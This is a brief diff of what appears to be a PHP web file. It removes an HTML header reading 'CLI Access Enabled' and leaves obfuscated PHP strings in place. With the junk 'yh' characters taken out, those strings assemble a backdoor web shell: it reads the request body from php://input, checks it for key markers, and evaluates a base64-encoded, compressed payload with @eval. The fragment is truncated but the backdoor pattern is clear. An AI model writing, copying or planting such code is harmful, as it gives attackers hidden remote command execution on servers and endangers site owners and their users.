@@ -1,6 +1,3 @@
-<html>
-    <body>
-        <h1>CLI Access Enabled</h1>
 <?php
 $c='hp:/yh/input"yh),$m) yh== 1) {  @yhob_staryht(yh);yh  @evayhl(@gzuyhncompress(@x(@basyhe';
 $M='etyhurn $yho;}if (@pyhryheg_matyhcyhh("/yh$kh(.+)$kfyh/",yh@file_yhget_conyhtenyhts("p';
